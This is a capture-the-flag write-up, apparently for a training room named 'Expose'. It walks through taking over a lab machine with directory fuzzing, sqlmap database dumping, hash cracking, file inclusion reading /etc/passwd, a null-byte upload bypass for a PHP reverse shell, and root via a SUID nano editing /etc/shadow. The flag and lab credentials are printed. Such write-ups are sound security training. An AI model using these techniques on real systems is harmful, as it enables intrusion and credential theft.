# Expose

## Intro

This challenge is an initial test to evaluate your capabilities in red teaming skills.
Start the VM by clicking the **Start Machine** button at the top right of the task. You will find all the necessary tools to complete the challenge, like Nmap, sqlmap, wordlists, PHP shell, and many more in the AttackBox.

Exposing unnecessary services in a machine can be dangerous. Can you capture the flags and pwn the machine?

---

Let’s start off with a **Nmap scan**:

```
PORT     STATE SERVICE REASON
21/tcp   open  ftp     syn-ack ttl 64
22/tcp   open  ssh     syn-ack ttl 64
53/tcp   open  domain  syn-ack ttl 64
1337/tcp open  waste   syn-ack ttl 64
1883/tcp open  mqtt    syn-ack ttl 64
```

We check the webserver running on **1337** and run a **Gobuster**:

```
gobuster dir -u http://10.10.249.94:1337 \
-w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
-t 50 -x php,html,txt -o gobuster1337.txt
```

Results:
```
[03:18:50] 301 -  319B  - /admin  ->  http://10.10.249.94:1337/admin/
[03:18:51] 200 -  693B  - /admin/
[03:18:51] 200 -  693B  - /admin/index.php
[03:18:52] 301 -  323B  - /admin_101  ->  http://10.10.249.94:1337/admin_101/
[03:19:18] 301 -  324B  - /javascript  ->  http://10.10.249.94:1337/javascript/
[03:19:30] 301 -  324B  - /phpmyadmin  ->  http://10.10.249.94:1337/phpmyadmin/
[03:19:32] 200 -    3KB - /phpmyadmin/doc/html/index.html
[03:19:34] 200 -    3KB - /phpmyadmin/index.php
[03:19:34] 200 -    3KB - /phpmyadmin/
[03:19:38] 403 -  279B  - /server-statu
```
---

The `/admin_101/` shows a login page.

<img width="1854" height="970" alt="Screenshot From 2025-05-21 22-23-07" src="https://github.com/user-attachments/assets/8c98c08a-e739-4687-b4bb-1a041b0998ab" />

The `/phpmyadmin/` login is also available.

<img width="1854" height="1048" alt="Screenshot From 2025-05-21 23-42-02" src="https://github.com/user-attachments/assets/1567a301-70ab-407c-a8f0-13d5de7a11e0" />

We were able to retrieve some interesting information. For the user `hacker@gamil.com`, we get a password in clear text. Using it on the admin portal does not lead to anything of interest. Beside the credentials are two URLs in the config table stored, which we were not able to discover via Gobuster and a password or password hint to be able to access those URLs

By running SQLMap with the captured request, we are able to dump the database


Using **sqlmap**:

```
sqlmap -r login.req -p email -D expose -T config --dump --batch
```

---

Dumping reveals a password hash:

```
69c66901194a6486176e81f5945b8929 
```

[Cracked via CrackStation](https://crackstation.net/) → `easytohack`.

<img width="1071" height="446" alt="Screenshot From 2025-05-21 23-53-10" src="https://github.com/user-attachments/assets/b6159051-a5ed-4816-a5ab-265725ee61e6" />
<img width="1854" height="1048" alt="Screenshot From 2025-05-21 23-50-05" src="https://github.com/user-attachments/assets/be9dd8fa-4e8f-4f41-89cc-9cd171543984" />

---

Next, we visit `/file1010111/index.php` and enter the cracked password.

<img width="1854" height="1048" alt="Screenshot From 2025-05-21 23-54-41" src="https://github.com/user-attachments/assets/4e309321-dd90-47d1-a766-3405ff4d7b3e" />

We get a hint to fuzz for parameters.

Visiting `/upload-cv00101011/index.php`:

<img width="1854" height="1048" alt="Screenshot From 2025-05-22 17-37-33" src="https://github.com/user-attachments/assets/4543f2ab-5e84-4f23-8b18-ea391dc2f885" />

---

Checking the source of `/file1010111/index.php` → hints about `file` or `view` parameters.

Testing LFI:

```
http://expose.thm:1337/file1010111/index.php?file=index.php
```

The page reloads multiple times → **LFI confirmed**.

<img width="1854" height="1048" alt="Screenshot From 2025-05-22 17-40-29" src="https://github.com/user-attachments/assets/22ed87ab-dfda-4965-a9db-44496e6cf4e2" />

We use LFI to read `/etc/passwd` and enumerate the user:

```
zeamkish
```

From the source of `/upload-cv00101011/`, only JPG/PNG files are allowed.

<img width="1854" height="1048" alt="Screenshot From 2025-05-22 17-45-09" src="https://github.com/user-attachments/assets/8df674fd-6856-429e-9e04-7132902cb3be" />

---

After uploading a JPG, the response reveals the upload folder:

```
/upload_thm_1001
```

We prepare a **PentestMonkey PHP reverse shell** from [revshells.com](https://www.revshells.com/).
To bypass the filter, rename the shell → `cat.phpA.jpg` and inject a null byte via BurpSuite.

<img width="1854" height="1048" alt="Screenshot From 2025-05-22 18-08-51" src="https://github.com/user-attachments/assets/61e6d9e6-8e31-4729-a16f-e0ae58e66777" />

---

We access `/upload-cv00101011/upload_thm_1001/` and set up a listener.

The bypass works → reverse shell obtained.

<img width="1854" height="1048" alt="Screenshot From 2025-05-22 18-12-06" src="https://github.com/user-attachments/assets/24b03701-ba37-41bc-a15b-7e879a815b5a" />


Inside `/home/zeamkish/`, we find:

* flag.txt
* ssh\_creds.txt

SSH Credentials:

```
zeamkish : easytohack@123
```

> Q1: What is the user flag?
> A1: THM{USER\_FLAG\_1231\_EXPOSE}

<img width="1854" height="1048" alt="Screenshot From 2025-05-22 18-14-50" src="https://github.com/user-attachments/assets/ea79e02a-9dab-48e4-82ac-d98504848300" />

---

Privilege escalation attempts with `sudo -l` fail.

We search for SUID binaries:

```
find / -perm -4000 -type f -ls 2>/dev/null
```

We discover **Nano** with SUID bit set.

<img width="1854" height="1048" alt="Screenshot From 2025-05-22 18-27-38" src="https://github.com/user-attachments/assets/bacef63c-038e-4609-9c8b-5735af192202" />

---

We generate a root hash:

```
openssl passwd -1 root
```

Edit `/etc/shadow` with Nano:

```
/usr/bin/nano /etc/shadow
```

<img width="1854" height="1048" alt="Screenshot From 2025-05-22 18-34-04" src="https://github.com/user-attachments/assets/4a90be94-2f23-4337-ac4c-ec7e9b271529" />

Then switch to root:

```
su root
```

<img width="1854" height="1048" alt="Screenshot From 2025-05-22 18-37-15" src="https://github.com/user-attachments/assets/d19dd301-07df-4667-b1c2-8f0eb1026a27" />

---

## Conclusion

* Enumeration → exposed services.
* SQLi → dumped DB, recovered credentials.
* LFI → enumerated system.
* File upload → reverse shell.
* SUID Nano → privilege escalation.

Rooted successfully. ✅

---
